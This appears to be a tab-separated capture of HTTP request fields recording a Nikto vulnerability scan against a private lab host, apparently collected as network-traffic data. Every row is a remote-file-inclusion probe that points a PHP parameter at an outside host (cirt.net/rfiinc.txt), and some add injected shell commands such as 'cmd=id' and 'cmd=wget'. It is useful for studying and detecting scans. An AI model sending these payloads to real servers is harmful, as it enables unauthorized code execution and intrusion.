http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									9037						1	http://192.168.1.101/web/cron.php?include_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004603)				/web/cron.php?include_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9044						1	http://192.168.1.101/web/crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004604)				/web/crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9051						1	http://192.168.1.101/web/crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004605)				/web/crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9058						1	http://192.168.1.101/web/cross.php?url=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004606)				/web/cross.php?url=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9067						1	http://192.168.1.101/web/cross.php?url=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004607)				/web/cross.php?url=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/custom_vars.php?sys[path_addon]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004608)				/web/custom_vars.php?sys[path_addon]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9078						1	http://192.168.1.101/web/customer/product.php?xcart_dir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004609)				/web/customer/product.php?xcart_dir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9088						1	http://192.168.1.101/web/cwb/comanda.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004610)				/web/cwb/comanda.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9098						1	http://192.168.1.101/web/datei.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004611)				/web/datei.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									9109						1	http://192.168.1.101/web/db/PollDB.php?CONFIG_DATAREADERWRITER=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004612)				/web/db/PollDB.php?CONFIG_DATAREADERWRITER=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9116						1	http://192.168.1.101/web/db/mysql/db.inc.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004613)				/web/db/mysql/db.inc.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9123						1	http://192.168.1.101/web/dbcommon/include.php?_APP_RELATIVE_PATH=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004614)				/web/dbcommon/include.php?_APP_RELATIVE_PATH=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9130						1	http://192.168.1.101/web/dbmodules/DB_adodb.class.php?PHPOF_INCLUDE_PATH=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004615)				/web/dbmodules/DB_adodb.class.php?PHPOF_INCLUDE_PATH=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9136						1	http://192.168.1.101/web/debugger.php?config_atkroot=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004616)				/web/debugger.php?config_atkroot=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9143						1	http://192.168.1.101/web/decoder/gallery.php?ccms_library_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004617)				/web/decoder/gallery.php?ccms_library_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9150						1	http://192.168.1.101/web/decoder/markdown.php?ccms_library_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004618)				/web/decoder/markdown.php?ccms_library_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9156						1	http://192.168.1.101/web/defaults_setup.php?ROOT_PATH=http://cirt.net/rfiinc.txt??cmd=ls		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004619)				/web/defaults_setup.php?ROOT_PATH=http://cirt.net/rfiinc.txt??cmd=ls
																	Keep-Alive										192.168.1.101									9164						1	http://192.168.1.101/web/defines.php?WEBCHATPATH=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004620)				/web/defines.php?WEBCHATPATH=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9171						1	http://192.168.1.101/web/demo/ms-pe02/catalog.php?cid=0&sid='%22&sortfield=title&sortorder=ASC&pagenumber=1&main=http://cirt.net/rfiinc.txt?&		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004621)				/web/demo/ms-pe02/catalog.php?cid=0&sid='%22&sortfield=title&sortorder=ASC&pagenumber=1&main=http://cirt.net/rfiinc.txt?&
																	Keep-Alive										192.168.1.101									9177						1	http://192.168.1.101/web/depouilg.php3?NomVote=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004622)				/web/depouilg.php3?NomVote=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9178						1	http://192.168.1.101/web/development.php?root_prefix=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004623)				/web/development.php?root_prefix=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9185						1	http://192.168.1.101/web/development.php?root_prefix=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004624)				/web/development.php?root_prefix=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9192						1	http://192.168.1.101/web/dfcode.php?DFORUM_PATH=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004625)				/web/dfcode.php?DFORUM_PATH=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9200						1	http://192.168.1.101/web/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004626)				/web/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9207						1	http://192.168.1.101/web/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.search.php?set_depth=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004627)				/web/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.search.php?set_depth=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9213						1	http://192.168.1.101/web/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004628)				/web/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9221						1	http://192.168.1.101/web/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004629)				/web/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9229						1	http://192.168.1.101/web/dialog.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004630)				/web/dialog.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9237						1	http://192.168.1.101/web/dialogs/a.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004631)				/web/dialogs/a.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									9246						1	http://192.168.1.101/web/dialogs/collorpicker.php?spaw_dir=http://cirt.net/rfiinc.txt?&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004632)				/web/dialogs/collorpicker.php?spaw_dir=http://cirt.net/rfiinc.txt?&cmd=id
																	Keep-Alive										192.168.1.101									9253						1	http://192.168.1.101/web/dialogs/img.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004633)				/web/dialogs/img.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									9261						1	http://192.168.1.101/web/dialogs/img_library.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004634)				/web/dialogs/img_library.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									9267						1	http://192.168.1.101/web/dialogs/table.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004635)				/web/dialogs/table.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									9274						1	http://192.168.1.101/web/dialogs/td.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004636)				/web/dialogs/td.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									9283						1	http://192.168.1.101/web/digitaleye_Path/module.php?menu=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004637)				/web/digitaleye_Path/module.php?menu=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9290						1	http://192.168.1.101/web/dir/prepend.php?_PX_config[manager_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004638)				/web/dir/prepend.php?_PX_config[manager_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9297						1	http://192.168.1.101/web/dir_thatware/config.php?root_path=http://cirt.net/rfiinc.txt?'		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004639)				/web/dir_thatware/config.php?root_path=http://cirt.net/rfiinc.txt?'
																	Keep-Alive										192.168.1.101									9304						1	http://192.168.1.101/web/direct.php?rf=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004640)				/web/direct.php?rf=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9310						1	http://192.168.1.101/web/direction/index.php?repertoire_config=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004641)				/web/direction/index.php?repertoire_config=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9318						1	http://192.168.1.101/web/directory/index.php?path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004642)				/web/directory/index.php?path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9319						1	http://192.168.1.101/web/display.php?pag=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004643)				/web/display.php?pag=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9320						1	http://192.168.1.101/web/display.php?path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004644)				/web/display.php?path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9328						1	http://192.168.1.101/web/displayCategory.php?basepath=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004645)				/web/displayCategory.php?basepath=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9336						1	http://192.168.1.101/web/dix.php3?url_phpartenaire=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004646)				/web/dix.php3?url_phpartenaire=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9343						1	http://192.168.1.101/web/dm-albums/template/album.php?SECURITY_FILE=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004647)				/web/dm-albums/template/album.php?SECURITY_FILE=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9350						1	http://192.168.1.101/web/doc/admin/index.php?ptinclude=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004648)				/web/doc/admin/index.php?ptinclude=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9357						1	http://192.168.1.101/web/doceboCore/lib/lib.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004649)				/web/doceboCore/lib/lib.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9358						1	http://192.168.1.101/web/doceboKms/modules/documents/lib.filelist.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004650)				/web/doceboKms/modules/documents/lib.filelist.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9364						1	http://192.168.1.101/web/doceboKms/modules/documents/tree.documents.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004651)				/web/doceboKms/modules/documents/tree.documents.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9371						1	http://192.168.1.101/web/doceboLms/lib/lib.repo.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004652)				/web/doceboLms/lib/lib.repo.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9378						1	http://192.168.1.101/web/doceboScs/lib/lib.teleskill.php?GLOBALS[where_scs]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004653)				/web/doceboScs/lib/lib.teleskill.php?GLOBALS[where_scs]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9385						1	http://192.168.1.101/web/docebocms/lib/lib.simplesel.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004654)				/web/docebocms/lib/lib.simplesel.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									9394						1	http://192.168.1.101/web/docs/front-end-demo/cart2.php?workdir=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004655)				/web/docs/front-end-demo/cart2.php?workdir=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									9400						1	http://192.168.1.101/web/dokeos/claroline/resourcelinker/resourcelinker.inc.php?clarolineRepositorySys=http://cirt.net/rfiinc.txt??&cmd=wget%20XXpathXX		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004656)				/web/dokeos/claroline/resourcelinker/resourcelinker.inc.php?clarolineRepositorySys=http://cirt.net/rfiinc.txt??&cmd=wget%20XXpathXX
